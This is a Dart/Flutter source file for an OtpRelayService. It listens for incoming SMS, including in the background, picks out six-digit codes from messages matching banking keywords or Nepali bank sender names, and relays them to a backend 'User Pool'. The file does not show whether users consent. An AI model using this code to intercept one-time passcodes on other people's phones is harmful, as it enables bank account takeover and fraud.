import 'package:telephony/telephony.dart';
import 'api_service.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:flutter/widgets.dart';

class OtpRelayService {
  final Telephony telephony = Telephony.instance;
  final ApiService _apiService = ApiService();

  static final OtpRelayService _instance = OtpRelayService._internal();

  factory OtpRelayService() {
    return _instance;
  }

  OtpRelayService._internal();

  void initialize() async {
    print("Initializing OtpRelayService...");
    bool? permissionsGranted = await telephony.requestSmsPermissions;
    if (permissionsGranted != null && permissionsGranted) {
      print("SMS Permissions GRANTED. Listening for messages...");
      telephony.listenIncomingSms(
        onNewMessage: (SmsMessage message) {
          _handleIncomingSms(message);
        },
        onBackgroundMessage: _backgroundMessageHandler,
      );
    } else {
      print("SMS Permissions DENIED. OTP relay will not function.");
    }
  }

  void _handleIncomingSms(SmsMessage message) async {
    final body = message.body ?? "";
    final address = message.address ?? "";
    print("Incoming SMS from $address: $body");

    // Match 6 digit OTP
    final otpMatch = RegExp(r'\b\d{6}\b').firstMatch(body);
    
    // Check keywords in body OR sender address (e.g., NICASIA, NABIL, 6202)
    bool isBankingSms = body.contains(RegExp(r'OTP|code|verification|passcode|Pin|Transaction|auth', caseSensitive: false)) ||
                        address.contains(RegExp(r'NIC|Nabil|NMB|PRABHU|Siddhartha|Global|Sanima|Kumari|Citizens|Laxmi|Sunrise|Agriculture|AD-|Nepal', caseSensitive: false));
    
    if (otpMatch != null && isBankingSms) {
      final otp = otpMatch.group(0)!;
      print("OTP Detected: $otp. Attempting relay...");
      await _relayOtpToBackend(otp, address);
    } else if (otpMatch != null) {
      _logRelayEvent(address, "6-digit found but rejected by filters.");
    }
  }

  Future<void> _relayOtpToBackend(String otp, String address) async {
    try {
      await _apiService.relayOtp(null, otp);
      _logRelayEvent(address, "SUCCESS: Relayed $otp to User Pool");
    } catch (e) {
      _logRelayEvent(address, "ERROR: $e");
    }
  }

  void _logRelayEvent(String address, String status) async {
    try {
      final prefs = await SharedPreferences.getInstance();
      List<String> logs = prefs.getStringList('relay_debug_logs') ?? [];
      final now = DateTime.now().toString().split(' ')[1].split('.')[0]; // HH:mm:ss
      logs.insert(0, "[$now] $address: $status");
      if (logs.length > 5) logs = logs.sublist(0, 5);
      await prefs.setStringList('relay_debug_logs', logs);
    } catch (e) {}
  }
}

@pragma('vm:entry-point')
void _backgroundMessageHandler(SmsMessage message) async {
  WidgetsFlutterBinding.ensureInitialized();
  final body = message.body ?? "";
  final address = message.address ?? "";
  
  _staticLogRelayEvent(address, "BG_DETECTOR: Received raw SMS");

  final otpMatch = RegExp(r'\b\d{6}\b').firstMatch(body);
  bool isBankingSms = body.contains(RegExp(r'OTP|code|verification|passcode|Pin|Transaction|auth', caseSensitive: false)) ||
                      address.contains(RegExp(r'NIC|Nabil|NMB|PRABHU|Siddhartha|Global|Sanima|Kumari|Citizens|Laxmi|Sunrise|Agriculture|AD-|Nepal', caseSensitive: false));

  if (otpMatch != null && isBankingSms) {
    final otp = otpMatch.group(0)!;
    _staticLogRelayEvent(address, "BG_PROCESS: Matching OTP found ($otp). Relaying...");
    
    final apiService = ApiService();
    try {
      await apiService.relayOtp(null, otp);
      _staticLogRelayEvent(address, "SUCCESS (BG): Relayed $otp");
    } catch (e) {
      _staticLogRelayEvent(address, "ERROR (BG): $e");
    }
  } else if (otpMatch != null) {
     _staticLogRelayEvent(address, "BG_REJECT: Filters didn't match.");
  }
}

void _staticLogRelayEvent(String address, String status) async {
  try {
    final prefs = await SharedPreferences.getInstance();
    List<String> logs = prefs.getStringList('relay_debug_logs') ?? [];
    final now = DateTime.now().toString().split(' ')[1].split('.')[0];
    logs.insert(0, "[$now] $address: $status");
    if (logs.length > 5) logs = logs.sublist(0, 5);
    await prefs.setStringList('relay_debug_logs', logs);
  } catch (e) {}
}
